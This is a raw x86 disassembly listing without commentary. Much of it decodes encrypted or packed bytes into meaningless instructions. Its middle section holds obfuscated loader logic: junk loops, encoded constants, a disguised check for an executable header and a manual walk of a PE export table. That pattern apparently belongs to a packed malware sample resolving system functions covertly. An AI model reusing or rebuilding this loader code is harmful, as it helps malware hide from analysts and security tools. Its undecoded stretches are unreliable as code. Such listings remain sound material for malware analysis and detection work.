  40e2f4:	aam    0x7
  40e2f6:	test   al,0x9
  40e2f8:	or     eax,0x3ad5ce4a
  40e2fd:	sub    ebp,DWORD PTR [edi+ecx*8+0x39]
  40e301:	popf   
  40e302:	mov    dl,0x8c
  40e304:	test   DWORD PTR [eax-0x30],ecx
  40e307:	jmp    0x23960838
  40e30c:	xchg   BYTE PTR [edx+eiz*1],bl
  40e30f:	xor    BYTE PTR ds:0x999a4403,0xe0
  40e316:	jb     0x40e38e
  40e318:	mov    eax,ds:0x621fa0c5
  40e31d:	or     DWORD PTR [ebx-0x4d],ebp
  40e320:	add    al,0x36
  40e322:	mov    DWORD PTR [ebx],esp
  40e324:	push   esp
  40e325:	pop    esp
  40e326:	(bad)  
  40e327:	pop    esi
  40e328:	add    al,0x3d
  40e32a:	lahf   
  40e32b:	cmp    eax,DWORD PTR [ebx]
  40e32d:	sbb    eax,0xe35328ae
  40e332:	and    eax,0xadbe89f4
  40e337:	add    edx,DWORD PTR [edx+0x11]
  40e33a:	mov    bl,0x8b
  40e33c:	or     dl,dh
  40e33e:	mov    eax,ds:0xe7f190b6
  40e343:	pop    ebx
  40e344:	xor    ecx,DWORD PTR [esi-0x6a]
  40e347:	out    0x50,al
  40e349:	pop    ebp
  40e34a:	push   cs
  40e34b:	(bad)  
  40e34c:	in     al,0x35
  40e34e:	jl     0x40e3a8
  40e350:	outs   dx,DWORD PTR ds:[esi]
  40e351:	call   0x60a66aed
  40e356:	es in  al,0xef
  40e359:	ins    DWORD PTR es:[edi],dx
  40e35a:	inc    ebp
  40e35b:	out    dx,eax
  40e35c:	call   0xd680:0x1a1f24a0
  40e363:	mov    ?,WORD PTR [esp+esi*1+0x27]
  40e367:	add    BYTE PTR [edx+0x19],bh
  40e36a:	retf   
  40e36b:	call   0x758:0xf65b1373
  40e372:	and    ebx,ecx
  40e374:	cmp    DWORD PTR ss:[ebp+ebp*2+0x3fa1708],ebx
  40e37c:	ret    0xaf0f
  40e37f:	push   es
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x60815ef2
  40e671:	sbb    BYTE PTR [edx],dl
  40e673:	jae    0x40e63f
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e619
  40e67c:	or     cl,BYTE PTR [edx]
  40e67e:	mov    cl,0x3f
  40e680:	fnstcw WORD PTR [esi+0x318d1dce]
  40e686:	ss jo  0x40e623
  40e689:	jmp    0x2c19:0xaa27fe0a
  40e690:	pusha  
  40e691:	cs je  0x40e6f8
  40e694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e695:	xor    DWORD PTR [esp+ebp*1+0x62456d08],edi
  40e69c:	xchg   esp,eax
  40e69d:	jb     0x40e6aa
  40e69f:	mov    edi,0xde587156
  40e6a4:	fsub   DWORD PTR [esi-0x2f]
  40e6a7:	and    eax,0x66ede6c5
  40e6ac:	mov    al,ds:0xf67ce1a3
  40e6b1:	pop    DWORD PTR [eax+0x1c]
  40e6b4:	mov    ebx,0xa64338c1
  40e6b9:	ror    BYTE PTR [edx+0xf],cl
  40e6bc:	lock leave 
  40e6be:	push   eax
  40e6bf:	in     al,0xc7
  40e6c1:	cli    
  40e6c2:	pop    edi
  40e6c3:	sbb    bh,ch
  40e6c5:	jns    0x4be8b06a
  40e6cb:	xchg   DWORD PTR [edx+0x5a],eax
  40e6ce:	xor    al,0x5c
  40e6d0:	fdiv   DWORD PTR [ecx+0x4103d53e]
  40e6d6:	sti    
  40e6d7:	pushf  
  40e6d8:	loop   0x40e71f
  40e6da:	cmc    
  40e6db:	dec    ecx
  40e6dc:	add    esp,eax
  40e6de:	mov    ds:0x67c50c76,eax
  40e6e3:	mov    eax,0x72b4948c
  40e6e8:	pop    edx
  40e6e9:	mov    cl,dh
  40e6eb:	mov    bh,0xf1
  40e6ed:	xchg   ebp,eax
  40e6ee:	cmp    al,0x38
  40e6f0:	icebp  
  40e6f1:	xchg   esp,eax
  40e6f2:	add    ch,bh
  40e6f4:	add    cl,BYTE PTR [ecx+0x36c477f5]
  40e6fa:	xchg   esp,eax
  40e6fb:	popa   
  40e6fc:	sub    eax,0xc78152eb
  40e701:	dec    edi
  40e702:	(bad)  
  40e704:	push   ecx
  40e705:	push   DWORD PTR [esi]
  40e707:	xchg   edi,eax
  40e708:	cmp    DWORD PTR [ecx],eax
  40e70a:	mov    esi,DWORD PTR [ecx-0x59]
  40e70d:	enter  0x36e5,0x7
  40e711:	daa    
  40e712:	sbb    eax,DWORD PTR [ecx-0x3e]
  40e715:	dec    esp
  40e716:	test   BYTE PTR [esp+ebp*1],al
  40e719:	(bad)  
  40e71a:	adc    DWORD PTR [edx],edi
  40e71c:	lock sub BYTE PTR [edi],0x3b
  40e720:	loop   0x40e711
  40e722:	jmp    0xc1e32dff
  40e727:	ret    0x332e
  40e72a:	inc    eax
  40e72b:	jbe    0x40e6c0
  40e72d:	andps  xmm4,XMMWORD PTR [ebx]
  40e730:	pop    eax
  40e731:	retf   
  40e732:	repz adc DWORD PTR [edx+ebp*8+0x5f],edx
  40e737:	fcomp  QWORD PTR [ebp+0x4a652190]
  40e73d:	stos   DWORD PTR es:[edi],eax
  40e73e:	adc    edi,ecx
  40e740:	or     BYTE PTR [edi+ecx*4-0x5c],dh
  40e744:	cli    
  40e745:	sbb    esi,DWORD PTR [ebx-0x4b]
  40e748:	cwde   
  40e749:	push   edi
  40e74a:	test   al,0x3c
  40e74c:	das    
  40e74d:	ins    BYTE PTR es:[edi],dx
  40e74e:	jb     0x40e6dc
  40e750:	out    dx,al
  40e751:	push   0xffffffa4
  40e753:	add    edx,DWORD PTR [ebp-0x4a33abb0]
  40e759:	mov    eax,ds:0xc36ef924
  40e75e:	loop   0x40e7c2
  40e760:	xchg   BYTE PTR [ebp-0x6b],bh
  40e763:	dec    ebp
  40e764:	jle    0x40e70f
  40e766:	xchg   edi,eax
  40e767:	or     BYTE PTR [ecx+0x235fb36d],dl
  40e76d:	pop    ecx
  40e76e:	jnp    0x40e7af
  40e770:	adc    bl,BYTE PTR [edx-0x28759b51]
  40e776:	or     al,0x8b
  40e778:	fwait
  40e779:	adc    dl,BYTE PTR [edx+0x2b07fe74]
  40e77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e780:	jae    0x40e703
  40e782:	xchg   DWORD PTR [esi],esi
  40e784:	sub    eax,0x78e0c55f
  40e789:	xchg   BYTE PTR ds:[ebx+ebp*4+0x52],ah
  40e78e:	out    0xd0,eax
  40e790:	scas   ax,WORD PTR es:[edi]
  40e792:	bound  esi,QWORD PTR [ecx+eax*8-0x42]
  40e796:	push   ecx
  40e797:	sti    
  40e798:	or     ah,BYTE PTR [ebx]
  40e79a:	popf   
  40e79b:	push   esp
  40e79c:	mov    ds:0x3a1956e9,al
  40e7a1:	frstor [ebx]
  40e7a3:	xor    al,0x3b
  40e7a5:	scas   eax,DWORD PTR es:[edi]
  40e7a6:	js     0x40e825
  40e7a8:	mov    fs,WORD PTR [ecx-0x69]
  40e7ab:	mov    al,ds:0x523c0dd5
  40e7b0:	mov    al,0xa2
  40e7b2:	adc    ebp,DWORD PTR [esi-0x37]
  40e7b5:	ja     0x40e771
  40e7b7:	scas   eax,DWORD PTR es:[edi]
  40e7b8:	cmp    eax,DWORD PTR [eax+eax*8]
  40e7bb:	ins    DWORD PTR es:[edi],dx
  40e7bc:	pop    ds
  40e7bd:	mov    dl,0x88
  40e7bf:	adc    al,cl
  40e7c1:	and    ebp,DWORD PTR [edi+0x13]
  40e7c4:	push   ecx
  40e7c5:	adc    al,BYTE PTR ds:0xe39566a3
  40e7cb:	ins    BYTE PTR es:[edi],dx
  40e7cc:	imul   ebx,DWORD PTR [eax+0x37],0x69d8f17
  40e7d3:	adc    DWORD PTR ds:0xd7593d23,ebx
  40e7d9:	lds    esi,FWORD PTR [edx]
  40e7db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7dc:	js     0x40e77c
  40e7de:	add    eax,0x117a4c01
  40e7e3:	clc    
  40e7e4:	or     cl,bl
  40e7e6:	dec    edi
  40e7e7:	pop    edi
  40e7e8:	je     0x40e798
  40e7ea:	add    BYTE PTR [eax+eiz*4+0x21b0a0e9],ch
  40e7f1:	pop    es
  40e7f2:	mov    ah,0x18
  40e7f4:	xchg   esi,eax
  40e7f5:	mov    ecx,0x81233cb7
  40e7fa:	or     al,0x2c
  40e7fc:	aad    0xb2
  40e7fe:	enter  0x95d5,0x9a
  40e802:	xchg   edx,eax
  40e803:	pop    edx
  40e804:	fdiv   QWORD PTR [ebx+0x4c36674c]
  40e80a:	sub    al,0x9a
  40e80c:	arpl   WORD PTR [esi-0x133678d8],di
  40e812:	adc    bh,BYTE PTR [ecx-0x80]
  40e815:	sub    edi,DWORD PTR [edi]
  40e817:	inc    edi
  40e818:	pop    es
  40e819:	ins    BYTE PTR es:[edi],dx
  40e81a:	inc    esp
  40e81b:	call   0xf91dae9a
  40e820:	jnp    0x40e873
  40e822:	inc    ebp
  40e823:	add    bh,BYTE PTR [ecx-0x3171e6bb]
  40e829:	cdq    
  40e82a:	sbb    esp,DWORD PTR [edx+edx*4]
  40e82d:	call   0xddbb6c74
  40e832:	cli    
  40e833:	shr    BYTE PTR [esp+ebp*8+0x5f],0xbf
  40e838:	mov    esp,0x7c57a8d0
  40e83d:	pop    edi
  40e83e:	jae    0x40e7e8
  40e840:	out    dx,al
  40e841:	jmp    0x7cecc1aa
  40e846:	into   
  40e847:	mov    eax,ds:0x6267cf24
  40e84c:	icebp  
  40e84d:	out    dx,eax
  40e84e:	in     eax,0xf9
  40e850:	or     BYTE PTR [ebx-0x9],dl
  40e853:	add    dh,ch
  40e855:	mov    ds:0x7520a594,al
  40e85a:	jnp    0x40e848
  40e85c:	ret    
  40e85d:	sub    DWORD PTR [eax+0x58],esi
  40e860:	dec    esi
  40e861:	test   DWORD PTR [edx+0x766b9f0],esp
  40e867:	pusha  
  40e868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e869:	in     eax,dx
  40e86a:	cmp    BYTE PTR [ebx],cl
  40e86c:	mov    ds:0x3d9773c6,al
  40e871:	pop    esi
  40e872:	adc    ebx,DWORD PTR [ecx]
  40e874:	jbe    0x40e8c5
  40e876:	adc    eax,0xd3953cb0
  40e87b:	fdivr  QWORD PTR [ebx-0x4f]
  40e87e:	out    dx,al
  40e87f:	dec    eax
  40e880:	ret    
  40e881:	aad    0x82
  40e883:	pop    es
  40e884:	add    DWORD PTR [ebx-0x4a31c794],edi
  40e88a:	mov    esi,0x1363de2a
  40e88f:	mov    ch,0x1a
  40e891:	nop
  40e892:	mov    edi,0x3e00da9a
  40e897:	inc    edi
  40e898:	in     eax,0x73
  40e89a:	lea    edi,[eax-0x7d9e374d]
  40e8a0:	clc    
  40e8a1:	xchg   ecx,eax
  40e8a2:	mov    ebx,0x52dd0601
  40e8a7:	aam    0xeb
  40e8a9:	xchg   edi,eax
  40e8aa:	push   0x1f7b83e2
  40e8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8b0:	and    ecx,eax
  40e8b2:	ret    
  40e8b3:	test   DWORD PTR [edx-0x101aac05],ecx
  40e8b9:	sub    DWORD PTR [ebp+ebp*1+0x1e],ecx
  40e8bd:	sbb    BYTE PTR [esi],0xbc
  40e8c0:	mov    ebx,DWORD PTR [bx]
  40e8c3:	adc    bh,ch
  40e8c5:	inc    ecx
  40e8c6:	ret    
  40e8c7:	out    0x9a,eax
  40e8c9:	xor    esi,DWORD PTR [ebx-0x2c]
  40e8cc:	and    dl,ch
  40e8ce:	sti    
  40e8cf:	jp     0x40e945
  40e8d1:	test   al,0xcc
  40e8d3:	int    0xd3
  40e8d5:	inc    ebp
  40e8d6:	sbb    eax,0xd770ee38
  40e8db:	sub    esp,edx
  40e8dd:	jp     0x40e8e2
  40e8df:	pushf  
  40e8e0:	push   es
  40e8e1:	add    esp,edi
  40e8e3:	inc    esp
  40e8e4:	add    BYTE PTR [edx-0x59],0x97
  40e8e8:	enter  0xf5bd,0x6c
  40e8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8ed:	addr16 fcmovbe st,st(4)
  40e8f0:	rcl    al,0x33
  40e8f3:	femms  
  40e8f5:	jmp    0x7acca70f
  40e8fa:	call   0xe270:0x6a98961d
  40e901:	or     BYTE PTR [edi],ah
  40e903:	mov    ds:0x5687ce93,al
  40e908:	les    edi,FWORD PTR [edi-0x16]
  40e90b:	cmp    esi,eax
  40e90d:	push   0xbae015e1
  40e912:	adc    edx,DWORD PTR [edi+0x139b8554]
  40e918:	aas    
  40e919:	xchg   edi,eax
  40e91a:	mov    bh,BYTE PTR [edx]
  40e91c:	mov    DWORD PTR [ecx+0x2275133e],esi
  40e922:	ins    DWORD PTR es:[edi],dx
  40e923:	lahf   
  40e924:	adc    edi,DWORD PTR [edx-0x78f62368]
  40e92a:	dec    esp
  40e92b:	(bad)  
  40e92c:	loope  0x40e8fe
  40e92e:	and    eax,edi
  40e930:	mov    ecx,0x5a8e79
  40e935:	les    ecx,FWORD PTR [ecx+0x2c1e21a0]
  40e93b:	int    0xf8
  40e93d:	xrelease mov BYTE PTR [bp-0x6e6],0x4a
  40e944:	add    edi,DWORD PTR [eax+0x44]
  40e947:	aaa    
  40e948:	sub    esp,edi
  40e94a:	cmp    BYTE PTR [eax+ebx*1+0x1a],dl
  40e94e:	adc    BYTE PTR [ebx+0x58],dh
  40e951:	adc    DWORD PTR [esp+eax*1],0x27
  40e955:	fisub  DWORD PTR [ebx]
  40e957:	mov    al,0x3b
  40e959:	repnz or dl,BYTE PTR [ebp-0x18]
  40e95d:	fldcw  WORD PTR [eax+0x33]
  40e960:	shl    BYTE PTR [ebx+0x726660ad],cl
  40e966:	leave  
  40e967:	mov    dh,0x3b
  40e969:	ret    
  40e96a:	cmp    al,0xaa
  40e96c:	mov    dl,BYTE PTR [ecx-0x40]
  40e96f:	add    DWORD PTR [eax+0x5d],esi
  40e972:	stc    
  40e973:	pop    eax
  40e974:	sub    al,0x34
  40e976:	lds    edi,FWORD PTR [ecx-0x75]
  40e979:	jmp    0x947c:0xf639e1d3
  40e980:	in     al,0xf5
  40e982:	mov    ch,0x67
  40e984:	sbb    dh,BYTE PTR [ecx]
  40e986:	in     eax,dx
  40e987:	fwait
  40e988:	retf   
  40e989:	xlat   BYTE PTR ds:[ebx]
  40e98a:	icebp  
  40e98b:	popa   
  40e98c:	aad    0x6
  40e98e:	outs   dx,BYTE PTR ds:[esi]
  40e98f:	iret   
  40e990:	cmp    ebx,DWORD PTR [ecx-0x12]
  40e993:	mov    edx,0xbb1895ca
  40e998:	or     BYTE PTR [eax+0x456470e8],dl
  40e99e:	fcom   QWORD PTR [eax]
  40e9a0:	add    ebp,DWORD PTR ss:[ecx]
  40e9a3:	add    al,0x42
  40e9a5:	and    eax,0x30cf4ba6
  40e9aa:	pop    esi
  40e9ab:	es ins DWORD PTR es:[edi],dx
  40e9ad:	xchg   esp,eax
  40e9ae:	sar    ah,0x1a
  40e9b1:	loopne 0x40e99d
  40e9b3:	pop    ss
  40e9b4:	rcr    BYTE PTR [eax],cl
  40e9b6:	shl    BYTE PTR [ebp-0x69182655],1
  40e9bc:	shr    BYTE PTR [edi],cl
  40e9be:	leave  
  40e9bf:	clc    
  40e9c0:	jmp    0x40e961
  40e9c2:	and    DWORD PTR [edi],ecx
  40e9c4:	jne    0x40ea01
  40e9c6:	inc    ecx
  40e9c7:	xchg   BYTE PTR [edi+0x72],dl
  40e9ca:	xchg   edi,eax
  40e9cb:	push   edi
  40e9cc:	test   esp,esp
  40e9ce:	sbb    dl,BYTE PTR [esi]
  40e9d0:	xchg   cl,dl
  40e9d2:	jge    0x40e964
  40e9d4:	or     BYTE PTR [eax+0x1cbb8850],cl
  40e9da:	arpl   WORD PTR [ecx],bp
  40e9dc:	ss jge 0x40e9a6
  40e9df:	sub    ah,ch
  40e9e1:	out    dx,al
  40e9e2:	push   edx
  40e9e3:	in     al,dx
  40e9e4:	retf   
  40e9e5:	sub    dh,dh
  40e9e7:	push   ebp
  40e9e8:	sbb    dl,0x35
  40e9eb:	imul   ebp,DWORD PTR [esp+eiz*2+0x7a3b0570],0xaf65b99a
  40e9f6:	jbe    0x40ea55
  40e9f8:	pop    ds
  40e9f9:	test   al,0xbe
  40e9fb:	js     0x40ea60
  40e9fd:	mov    ecx,0xeb57a498
  40ea02:	mov    esp,0x8cff045a
  40ea07:	sqrtps xmm2,xmm1
  40ea0a:	mov    esi,0x2242a217
  40ea0f:	stc    
  40ea10:	mov    eax,0x790e01c5
  40ea15:	jp     0x40e99e
  40ea17:	adc    BYTE PTR [edx+ebp*1],0x62
  40ea1b:	jb     0x40ea1b
  40ea1d:	lahf   
  40ea1e:	test   al,0x1a
  40ea20:	fs dec esi
  40ea22:	mov    ah,0xab
  40ea24:	test   BYTE PTR [ebx],0xfc
  40ea27:	icebp  
  40ea28:	imul   ecx,eax,0xffffffb7
  40ea2b:	xor    DWORD PTR [ecx+0x4a23382f],ebx
  40ea31:	push   edi
  40ea32:	and    esp,DWORD PTR [esi-0x4d80fe03]
  40ea38:	les    edi,FWORD PTR [eax]
  40ea3a:	ja     0x40ea35
  40ea3c:	xchg   edi,eax
  40ea3d:	lds    edi,FWORD PTR [edx+0x5c]
  40ea40:	fst    DWORD PTR [esi+0x7f]
  40ea43:	je     0x40ea25
  40ea45:	loope  0x40ea16
  40ea47:	sahf   
  40ea48:	mov    eax,0x487e5b6c
  40ea4d:	mov    al,al
  40ea4f:	push   0xffffffac
  40ea51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea52:	ins    DWORD PTR es:[edi],dx
  40ea53:	out    dx,al
  40ea54:	mov    ebx,0x2a1ac085
  40ea59:	push   esi
  40ea5a:	cld    
  40ea5b:	pop    esi
  40ea5c:	dec    edx
  40ea5d:	push   ebp
  40ea5e:	add    edx,ebx
  40ea60:	pop    edx
  40ea61:	es inc ecx
  40ea63:	xlat   BYTE PTR ds:[ebx]
  40ea64:	cmp    dh,dh
  40ea66:	daa    
  40ea67:	cs cwde 
  40ea69:	mov    ebp,0x3d9ae689
  40ea6e:	pop    es
  40ea6f:	aam    0x8b
  40ea71:	out    dx,eax
  40ea72:	pusha  
  40ea73:	loope  0x40ea6f
  40ea75:	test   eax,0x78e85429
  40ea7a:	pop    edx
  40ea7b:	add    DWORD PTR [ebp+0x6f],edx
  40ea7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea7f:	pop    es
  40ea80:	mov    ds:0xbb9f2808,eax
  40ea85:	push   ss
  40ea86:	or     al,BYTE PTR [esi+0x66b13df7]
  40ea8c:	out    dx,eax
  40ea8d:	xchg   ebp,eax
  40ea8e:	or     BYTE PTR [ebp+eiz*1+0x3eb4bad1],ah
  40ea95:	(bad)  
  40ea96:	push   ss
  40ea97:	cli    
  40ea98:	lahf   
  40ea99:	jb     0x40ea68
  40ea9b:	es and eax,0x39ce32ef
  40eaa1:	jnp    0x40ea81
  40eaa3:	dec    cx
  40eaa5:	add    al,0xb5
  40eaa7:	xor    bl,ch
  40eaa9:	jge    0x40ea2f
  40eaab:	out    0xf7,eax
  40eaad:	cmp    al,0x17
  40eaaf:	sub    DWORD PTR [eax+eiz*2-0x558e8ef2],0xf1774590
  40eaba:	jns    0x40eb35
  40eabc:	xchg   ebp,eax
  40eabd:	mov    ah,0xfe
  40eabf:	int    0x26
  40eac1:	pop    esp
  40eac2:	sub    eax,0xff028621
  40eac7:	xchg   DWORD PTR ss:[ebx-0x33edb69e],esi
  40eace:	jl     0x40eb46
  40ead0:	or     al,0x2a
  40ead2:	mov    bh,0x9
  40ead4:	push   edi
  40ead5:	js     0x40ea60
  40ead7:	sar    BYTE PTR [esi],1
  40ead9:	shl    DWORD PTR [ecx-0x1e498947],1
  40eadf:	or     al,0xab
  40eae1:	sahf   
  40eae2:	rcr    esp,0x9d
  40eae5:	push   0x424f890
  40eaea:	stos   BYTE PTR es:[edi],al
  40eaeb:	or     dl,BYTE PTR [esi-0x7f69fafa]
  40eaf1:	jmp    0x3c4:0x261a8604
  40eaf8:	inc    esp
  40eaf9:	add    dh,bh
  40eafb:	inc    edx
  40eafc:	(bad)  
  40eafd:	jbe    0x40eac8
  40eaff:	clc    
  40eb00:	push   ds
  40eb01:	in     eax,dx
  40eb02:	adc    al,0xa5
  40eb04:	call   FWORD PTR [ebp-0x19ae11a5]
  40eb0a:	or     dl,BYTE PTR [ebx-0x3b]
  40eb0d:	fistp  QWORD PTR [ecx+0x17]
  40eb10:	jge    0x40ea9b
  40eb12:	adc    dl,BYTE PTR [esi+0x23fd5eda]
  40eb18:	cmp    DWORD PTR [edi-0x3dab2f37],ebp
  40eb1e:	fcomp  QWORD PTR [ebx+0x61261f1]
  40eb24:	jns    0x40eab4
  40eb26:	pop    esp
  40eb27:	fwait
  40eb28:	pop    ecx
  40eb29:	nop
  40eb2a:	sbb    eax,DWORD PTR [eax-0x2254e448]
  40eb30:	xor    esi,DWORD PTR [edi+0x19]
  40eb33:	cmp    ah,0x91
  40eb36:	cmc    
  40eb37:	leave  
  40eb38:	mov    edx,0x74158bb7
  40eb3d:	out    dx,al
  40eb3e:	xchg   ecx,eax
  40eb3f:	inc    edx
